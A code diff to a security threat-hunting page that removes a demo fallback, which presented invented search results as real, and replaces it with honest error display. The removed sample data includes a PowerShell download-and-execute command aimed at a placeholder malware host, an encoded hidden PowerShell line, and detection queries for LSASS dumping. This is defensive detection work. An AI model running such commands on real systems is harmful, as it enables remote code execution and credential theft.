@@ -15,7 +15,8 @@
  *
  *   2. **SIEM analyst mode**: Monaco editor with KQL / Lucene / SQL /
  *      ES|QL tabs, time-range picker, results table with severity
- *      tinting, copy-to-clipboard, pivot-to-graph, and demo fallback.
+ *      tinting, copy-to-clipboard, and pivot-to-graph. A failed call shows its
+ *      error with a Retry; there is no sample data.
  *
  * The right rail shows persisted saved hunts (savedHuntsApi) with
  * re-run + delete actions; we deliberately render this list in addition
@@ -120,84 +121,6 @@ LIMIT 200`,
 | SORT @timestamp DESC
 | LIMIT 200`,
 };
-
-// ─── Demo fallback ────────────────────────────────────────────────────────────
-
-// Deterministic timestamps — no Date.now() to avoid SSR hydration mismatches.
-const DEMO_RESULTS: HuntResult[] = [
-  {
-    id: 'r-001',
-    timestamp: '2026-05-06T11:48:00Z',
-    source: 'crowdstrike',
-    severity: 'high',
-    fields: {
-      host: 'WORKSTATION-042',
-      user: 'john.doe',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
-      'process.parent.name': 'EXCEL.EXE',
-    },
-    highlight: 'powershell.exe -nop -w hidden -enc',
-  },
-  {
-    id: 'r-002',
-    timestamp: '2026-05-06T11:19:00Z',
-    source: 'defender',
-    severity: 'critical',
-    fields: {
-      host: 'SERVER-DC01',
-      user: 'svc_admin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
-      'network.destination.ip': '185.220.101.45',
-    },
-    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
-  },
-  {
-    id: 'r-003',
-    timestamp: '2026-05-06T10:00:00Z',
-    source: 'splunk',
-    severity: 'medium',
-    fields: {
-      host: 'WORKSTATION-019',
-      user: 'maria.lin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
-    },
-  },
-];
-
-const DEMO_SAVED: SavedSearch[] = [
-  {
-    id: 'demo-1',
-    name: 'Encoded PowerShell',
-    query: STARTERS.kql,
-    language: 'kql',
-    createdAt: '2026-05-04T12:00:00Z',
-    pinned: true,
-  },
-  {
-    id: 'demo-2',
-    name: 'LSASS access attempts',
-    query:
-`process where process.name in ("procdump.exe", "procdump64.exe")
-  and process.command_line like~ "*lsass*"`,
-    language: 'kql',
-    createdAt: '2026-05-01T12:00:00Z',
-  },
-  {
-    id: 'demo-3',
-    name: 'Outbound connections to TOR exits',
-    query:
-`network where network.direction == "outbound"
-  and network.destination.ip in <tor_exit_nodes>`,
-    language: 'kql',
-    createdAt: '2026-04-27T12:00:00Z',
-  },
-];
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
@@ -635,7 +558,6 @@ export function HuntView() {
   const [activeSavedId, setActiveSavedId] = useState<string | null>(null);
   const [activeSavedHuntId, setActiveSavedHuntId] = useState<string | null>(null);
   const editorRef = useRef<unknown>(null);
-  const [demoMode, setDemoMode] = useState(false);
 
   // Natural-language hero state.
   const [nlInput, setNlInput] = useState('');
@@ -652,16 +574,8 @@ export function HuntView() {
 
   const savedState = useSWR<SavedSearch[]>(
     'hunt.saved',
-    async () => {
-      try {
-        const res = await huntApi.listSaved();
-        return res.searches;
-      } catch (err) {
-        // First-load fallback to demo so the UI is never empty.
-        setDemoMode(true);
-        throw err;
-      }
-    },
+    // A failure reaches `savedError` below, with a Retry. It used to flip a demo flag and substitute three invented saved searches.
+    async () => (await huntApi.listSaved()).searches,
     {
       revalidateOnFocus: false,
       shouldRetryOnError: false,
@@ -677,12 +591,10 @@ export function HuntView() {
     },
   );
 
-  // If saved-search fetch failed, transparently substitute demo list so the UI
-  // is usable.
-  const savedItems: SavedSearch[] =
-    savedState.data ?? (demoMode ? DEMO_SAVED : []);
-  const savedError =
-    savedState.error && !demoMode ? savedState.error : undefined;
+  const savedItems: SavedSearch[] = savedState.data ?? [];
+  const savedError = savedState.error ?? undefined;
+  // What the status pill shows: the backend's real state, never a made-up one.
+  const backendDown = Boolean(runError) || Boolean(savedState.error);
   const savedHuntsItems: SavedHunt[] = savedHuntsState.data ?? [];
   const savedHuntsError = savedHuntsState.error;
 
@@ -698,11 +610,9 @@ export function HuntView() {
   /**
    * Translate an NL question via /api/v1/nl-query/translate, populate
    * the editor with the ES|QL translation, and immediately invoke the
-   * hunt runner. Any failure surfaces as a toast and falls back to the
-   * legacy demo-data path so the UI never strands the user with a blank
-   * screen — the goal of the /hunt page is "ask a question, see
-   * something" within 5 seconds, even when the backend can't actually
-   * answer.
+   * hunt runner. If the question cannot be translated it says so and STOPS:
+   * it used to announce "using demo results" and run whatever was already in
+   * the editor, showing an unrelated query's results as the answer.
    */
   const submitNLQuery = async (question: string) => {
     const cleaned = question.trim();
@@ -720,24 +630,23 @@ export function HuntView() {
     try {
       const t = await nlQueryApi.translate({ question: cleaned });
       translatedEsql = t.esql || '';
+      if (!translatedEsql.trim()) throw new Error('the translator returned no query');
       explanation = t.explanation || '';
       setLanguage('esql');
-      setQuery(translatedEsql || `// Could not translate: ${cleaned}`);
+      setQuery(translatedEsql);
       lastStarter.current = ''; // user-controlled now
       setNlSubmittedQuery(cleaned);
       setNlExplanation(explanation || null);
     } catch (err) {
       console.error('NL translate failed', err);
-      toast.error('Could not translate the question — using demo results');
+      toast.error(`Could not translate the question: ${err instanceof Error && err.message ? err.message : 'the translator is unreachable'}. Edit the query and press Run.`);
       setNlSubmittedQuery(cleaned);
       setNlExplanation(null);
+      return;
     } finally {
       setNlPending(false);
     }
 
-    // Run the hunt regardless of translate outcome — falls back to demo
-    // results internally, which is still useful UX (see component
-    // docstring).
     void runHunt({
       languageOverride: 'esql',
       queryOverride: translatedEsql || query,
@@ -769,17 +678,12 @@ export function HuntView() {
         limit: 200,
       });
       setResults(res);
-      setDemoMode(false);
     } catch (err) {
-      // Demo fallback so the page still feels alive without a seeded backend.
-      setResults({
-        total: DEMO_RESULTS.length,
-        took: 42,
-        hits: DEMO_RESULTS,
-      });
-      setDemoMode(true);
+      // Show the failure. This used to put invented hits ("john.doe" on "WORKSTATION-042") in the results and toast "showing demo results", so a
+      // failed search looked like a real one.
+      setResults(null);
       setRunError(err);
-      toast('Backend unreachable — showing demo results');
+      toast.error(`Search failed: ${err instanceof Error && err.message ? err.message : 'the backend is unreachable'}`);
     } finally {
       setRunning(false);
     }
@@ -939,7 +843,7 @@ export function HuntView() {
             <span
               className={clsx(
                 'inline-flex items-center gap-1.5 rounded-full px-2 py-0.5 ring-1',
-                demoMode
+                backendDown
                   ? 'bg-amber-500/10 text-amber-300 ring-amber-500/30'
                   : 'bg-emerald-500/10 text-emerald-300 ring-emerald-500/30',
               )}
@@ -947,10 +851,10 @@ export function HuntView() {
               <span
                 className={clsx(
                   'h-1.5 w-1.5 rounded-full',
-                  demoMode ? 'bg-amber-400' : 'bg-emerald-400 animate-ping-slow',
+                  backendDown ? 'bg-amber-400' : 'bg-emerald-400 animate-ping-slow',
                 )}
               />
-              {demoMode ? 'Demo data' : 'Live backend'}
+              {backendDown ? 'Backend unreachable' : 'Live backend'}
             </span>
           </div>
         </div>
@@ -1154,6 +1058,8 @@ export function HuntView() {
                 <Skeleton className="h-12 w-full rounded-lg" />
                 <Skeleton className="h-12 w-full rounded-lg" />
               </div>
+            ) : runError ? (
+              <ErrorState title="Search failed" error={runError} onRetry={() => void runHunt()} />
             ) : !results ? (
               <EmptyState
                 title="Press Run to begin"
@@ -1165,11 +1071,9 @@ export function HuntView() {
                   No matches in the selected window
                 </p>
                 <p className="mt-1 text-xs text-slate-500">
-                  {runError
-                    ? 'Backend unreachable — but here is the parsed query so you can refine it.'
-                    : nlSubmittedQuery
-                      ? 'The translator parsed your question (see editor) but found no events. Try a wider time range.'
-                      : 'Either the data is clean, or the query is too tight.'}
+                  {nlSubmittedQuery
+                    ? 'The translator parsed your question (see editor) but found no events. Try a wider time range.'
+                    : 'Either the data is clean, or the query is too tight.'}
                 </p>
               </div>
             ) : (
